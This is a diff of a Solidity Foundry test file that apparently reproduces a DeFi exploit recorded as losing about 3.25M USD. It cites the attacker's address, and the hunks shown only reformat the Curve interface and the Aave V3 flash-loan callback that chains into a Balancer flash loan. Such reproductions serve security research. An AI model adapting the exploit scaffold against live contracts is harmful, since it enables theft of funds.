@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~3.25M USD$
 // Attacker : https://etherscan.io/address/0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa
@@ -40,12 +39,8 @@ interface ICurve {
 
     function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
 
-    function remove_liquidity(
-        uint256 token_amount,
-        uint256[2] memory min_amounts,
-        bool use_eth,
-        address receiver
-    ) external;
+    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts, bool use_eth, address receiver)
+        external;
 
 }
 
@@ -132,13 +127,11 @@ contract ContractTest is Test {
     }
 
     // @Info aaveV3 flashLoan callback
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initator,
-        bytes calldata params
-    ) external payable returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initator, bytes calldata params)
+        external
+        payable
+        returns (bool)
+    {
         balancerFlashloan();
         IERC20(asset).approve(address(aaveV3), premium + amount);
         return true;
